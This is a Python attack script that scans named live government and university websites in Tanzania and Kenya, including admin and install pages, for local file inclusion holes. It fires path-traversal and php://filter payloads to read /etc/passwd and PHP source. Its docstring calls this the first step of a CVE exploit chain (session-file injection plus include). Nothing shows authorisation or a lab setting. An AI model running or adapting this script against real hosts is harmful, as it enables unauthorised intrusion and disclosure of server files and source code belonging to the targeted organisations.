#!/usr/bin/env python3
"""Hunt an LFI sink on the live hosts - the prerequisite for CVE-2026-109619
chain A (session-file injection + include).

Every hit has to prove content, not just status: `/etc/passwd` must come back
with a real passwd line, or a php://filter base64 body must decode to something
that looks like PHP/source. Soft-404 hosts are baselined per endpoint.
"""
from __future__ import annotations

import base64
import concurrent.futures as cf
import re
import sys
import urllib.parse

sys.path.insert(0, ".")
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
scan.TIMEOUT = 12

PASSWD_RE = re.compile(r"^[a-z_][a-z0-9_.-]*:[x*!]?[^:]*:\d+:\d+:", re.M)

# endpoint -> parameters that plausibly feed an include
TARGETS = {
    "https://www.ncaa.go.tz/index.php": ["file", "page", "p", "view", "include", "inc",
                                         "path", "template", "lang", "doc", "dir"],
    "https://uonbi.ac.ke/index.php": ["file", "page", "q", "view", "include", "path",
                                      "template", "lang"],
    "https://uonbi.ac.ke/install.php": ["profile", "locale", "file", "path"],
    "https://www.pc.go.tz/root/index.php": ["page", "view", "file", "inc", "path",
                                            "load", "template", "mod", "p", "url"],
    "https://www.pc.go.tz/admin/index.php": ["page", "view", "file", "inc", "path",
                                             "load", "template", "p"],
    "https://www.pc.go.tz/index.php": ["page", "view", "file", "inc", "path", "p"],
}

PAYLOADS = [
    "/etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd%00",
    "../../../../etc/passwd%00",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

BASES = {}


def baseline(url):
    """Body of the endpoint with a junk value, to detect echo-everything hosts."""
    if url not in BASES:
        r = scan.fetch(url + "?" + urllib.parse.urlencode({"zzq": "zz" * 4}))
        BASES[url] = (len(r["body"]), r["body"][:400]) if r else None
    return BASES[url]


def verdict(body):
    if PASSWD_RE.search(body):
        return "PASSWD CONTENT"
    m = re.search(r"[A-Za-z0-9+/=\r\n]{80,}", body)
    if m:
        try:
            raw = base64.b64decode(re.sub(r"\s+", "", m.group(0)) + "===")
            if b"<?php" in raw[:400] or b"root:x:0:0" in raw:
                return "BASE64 SOURCE"
        except Exception:
            pass
    return None


def probe(job):
    url, param, payload = job
    q = urllib.parse.urlencode({param: payload})
    r = scan.fetch(f"{url}?{q}")
    if not r or r["status"] != 200:
        return None
    b = baseline(url)
    if b and len(r["body"]) == b[0] and r["body"][:400] == b[1] and payload != "/etc/passwd":
        return None
    why = verdict(r["body"])
    if not why:
        return None
    return {"url": url, "param": param, "payload": payload, "why": why,
            "len": len(r["body"])}


jobs = [(u, p, pl) for u, params in TARGETS.items() for p in params for pl in PAYLOADS]
print(f"{len(jobs)} requests across {len(TARGETS)} endpoints")

hits = []
with cf.ThreadPoolExecutor(max_workers=5) as pool:
    for res in pool.map(probe, jobs):
        if res:
            hits.append(res)
            print(f"  HIT {res['url']}?{res['param']}={res['payload']} "
                  f"[{res['why']}] len={res['len']}")

print(f"\n{len(hits)} hit(s)")
